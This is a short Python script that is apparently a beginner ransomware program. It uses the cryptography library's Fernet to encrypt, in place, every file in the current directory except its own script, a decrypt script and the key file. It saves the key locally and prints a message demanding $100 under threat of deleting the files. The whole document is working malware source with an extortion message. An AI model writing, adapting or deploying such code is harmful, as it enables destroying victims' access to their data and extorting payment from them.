from cryptography.fernet import Fernet
import os

# Check whether keyFile exists. If not, then create a new file or read the existing file and store the value in the key variable.
keyFile = "encryptedKey.key"
if not os.path.exists(keyFile):
    key = Fernet.generate_key()
    with open(keyFile, "wb") as encryptedKey:
        encryptedKey.write(key)
else:
    with open(keyFile, "rb") as encryptedKey:
        key = encryptedKey.read()


files = []

for path in os.listdir():
    if (path == "main.py" or path == "encryptedKey.key" or path == "decrypt.py"):
        continue
    if os.path.isfile(path):
        files.append(path)

for file in files:
    with open(file, "rb") as file1:
        rawData = file1.read()
    encryptedRawData = Fernet(key).encrypt(rawData)

    with open(file, "wb") as file2:
        file2.write(encryptedRawData)

print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
